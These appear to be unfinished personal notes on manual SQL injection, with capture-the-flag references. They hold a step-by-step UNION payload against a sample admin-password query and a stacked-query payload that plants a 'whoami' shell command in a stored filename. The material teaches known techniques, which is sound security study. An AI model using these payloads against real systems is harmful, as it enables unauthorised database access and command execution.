# Manual SQL Exploitation

## Manual SQLi from scratch

* [https://delayma.wordpress.com/2018/12/12/hacker-101-ctf-writeup-micro-cms-v2-1-3/](https://delayma.wordpress.com/2018/12/12/hacker-101-ctf-writeup-micro-cms-v2-1-3/)
* [https://delayma.wordpress.com/category/ctf-challenges/](https://delayma.wordpress.com/category/ctf-challenges/)
* My notes -&gt; sqli1.txt

## 1\) Force SQL query to print user defined output

* There are many ways in which print user defined input. The below SQL query will print user defined string "CUSTOMMESSAGE"
  * `SELECT 'CUSTOMMESSAGE'`
  * `SELECT TOP 1  'CUSTOMMESSAGE' AS` _`column_name`_ `FROM` _`table_name`_ `WHERE '1' = '1'`

### Example

* Given SQL query : `SELECT password FROM admins WHERE username=\'%s\'`
  * Input `%s` is user defined input.
  * _Payload =_ **%s**
* Step 1 : Make the current SELECT query to print null output.
  * This could be done here by sending invalid username for input `%s` 
  * Here we do not need to close the quote. If we add ending quote we will get syntax error.
  * _Payload_  =  **user\_2**
  * _Final SQL query_  =  **`SELECT password FROM admins WHERE username='user_2'`**
* Step 2 : Now we need to add another SELECT query which will be executed after this select in the same inline.
  * This could be done using `UNION` keyword.
  * Here we need to handle quotes properly to make final SQL query syntax correct. See the final SQL query will already have a ending quote, so payload needs to have a missing ending quote.
  * _Payload =_ **user\_2' UNION SELECT \_\_\_\_\_\_**
  * _Final SQL query  =_  **`SELECT password FROM admins WHERE username='user2' UNION SELECT ______'`**
* Step 3 : Now The last part is to define the SELECT statement such that it will print user defined input.
  * _Payload =_ **user2' UNION SELECT 'CUSTOMMESSAGE**
  * _Final SQL Query =_ **`SELECT password FROM admins WHERE username='user2' UNION SELECT 'CUSTOMMESSAGE'`**

## 2\) Executing Stacked SQL queries

* `SELECT filename FROM photos WHERE id=1; update photos set filename=' || whoami ' where id=3; commit; --`
* Ref : [https://secureops.io/2019/09/magical-image-gallery/](https://secureops.io/2019/09/magical-image-gallery/)

## Execute OS command

* d

